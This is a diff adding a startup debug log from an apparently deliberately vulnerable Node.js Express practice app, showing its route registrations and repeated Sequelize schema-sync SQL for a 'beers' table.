@@ -1,0 +1,559 @@
+2025-12-18T12:41:24.226Z sequelize:pool pool created with max/min: 5/0, no replication
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "x-powered-by" to true
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "etag" to 'weak'
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "etag fn" to [Function: generateETag]
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "env" to 'development'
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "query parser" to 'extended'
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "query parser fn" to [Function: parseExtendedQueryString]
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "subdomain offset" to 2
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "trust proxy" to false
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "trust proxy fn" to [Function: trustNone]
+Thu, 18 Dec 2025 12:41:24 GMT express:application booting in development mode
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "view" to [Function: View]
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "views" to '/home/kali/vuln-node.js-express.js-app/views'
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "jsonp callback name" to 'callback'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' query
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' expressInit
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' jsonParser
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' session
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' cookieParser
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/order'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/order'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/order'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/beer-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/beer-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/beer-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/search/:filter/:query'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/search/:filter/:query'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/search/:filter/:query'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/admin/users/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/admin/users/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/admin/users/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/user/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/user/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/user/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/user/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/user/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route delete '/v1/user/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/user/token'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/user/token'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/user/token'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/admin/promote/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/admin/promote/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route put '/v1/admin/promote/:id'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/status/:brand'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/status/:brand'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/status/:brand'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/redirect/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/redirect/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/redirect/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/init'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/init'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/init'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/test/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/test/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/test/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/admin/new-beer/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/admin/new-beer/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/admin/new-beer/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/admin/upload-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/admin/upload-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/admin/upload-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/admin/upload-pic/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/admin/new-beer-xml/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/admin/new-beer-xml/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/admin/new-beer-xml/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route post '/v1/admin/new-beer-xml/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/register'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/register'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/register'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/registerform'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/registerform'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/registerform'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/login'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/login'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/login'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/profile'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/profile'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/profile'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/beer'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/beer'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/beer'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/api-docs' <anonymous>
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/api-docs' swaggerInitFn
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/api-docs' serveStatic
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/api-docs' <anonymous>
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route new '/v1/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/v1/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:route get '/v1/api-docs'
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "views" to '/home/kali/vuln-node.js-express.js-app/src/templates'
+Thu, 18 Dec 2025 12:41:24 GMT express:application set "view engine" to 'html'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' serveStatic
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+Thu, 18 Dec 2025 12:41:24 GMT express:router use '/' <anonymous>
+Thu, 18 Dec 2025 12:41:24 GMT express:router:layer new '/'
+2025-12-18T12:41:24.503Z sequelize:connection:sqlite connection acquired default
+2025-12-18T12:41:24.503Z sequelize:sql:sqlite Executing (default): SELECT name FROM sqlite_master WHERE type='table' AND name='beers';
+2025-12-18T12:41:24.518Z sequelize:sql:sqlite Executed (default): SELECT name FROM sqlite_master WHERE type='table' AND name='beers';
+2025-12-18T12:41:24.519Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.520Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.523Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.524Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.527Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.529Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.530Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.531Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.531Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.532Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.533Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.534Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.534Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.535Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.536Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.671Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.672Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.678Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.684Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.701Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.702Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.714Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.714Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.715Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.716Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.728Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.729Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.731Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.731Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.732Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.733Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.734Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.735Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.760Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.760Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.761Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.761Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.774Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.775Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.789Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.789Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.790Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.790Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.804Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.805Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.805Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.805Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.806Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.806Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.806Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.807Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.821Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.822Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.822Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.822Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.835Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.835Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.849Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.849Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.850Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.850Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.861Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.861Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.861Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.862Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.862Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.862Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.862Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.863Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.874Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.874Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.874Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.874Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.884Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.885Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.892Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.892Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.894Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.894Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.910Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.910Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.911Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.911Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.912Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.913Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.913Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.913Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.926Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.926Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.926Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.927Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.938Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.939Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.951Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.951Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.951Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:24.952Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.961Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:24.961Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.961Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:24.962Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.962Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:24.962Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.962Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:24.963Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
